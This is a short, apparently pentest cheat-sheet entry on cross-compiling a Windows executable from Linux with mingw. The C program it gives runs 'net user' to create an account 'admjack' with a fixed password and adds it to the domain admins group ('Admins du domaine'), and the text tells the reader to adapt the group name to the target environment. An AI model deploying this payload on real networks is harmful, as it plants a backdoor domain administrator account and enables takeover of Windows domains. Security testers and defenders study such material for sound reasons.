## Compile a Windows Executable From a Linux Host

Install the cross-compiler.
```
sudo aptitude install mingw-w64
```

In file `adddom.c`:
```
#include <stdlib.h>
#include <windows.h>

int main(void)
{
  system("cmd.exe /c net user admjack P@$$word /ADD && net group \"Admins du domaine\" admjack /ADD /DOMAIN");
  return 0;
}
```

*Do not forget to modify the group name regarding your environment.*

Then:
```
i586-mingw32msvc-gcc -static adddom.c -o adddom.exe
```
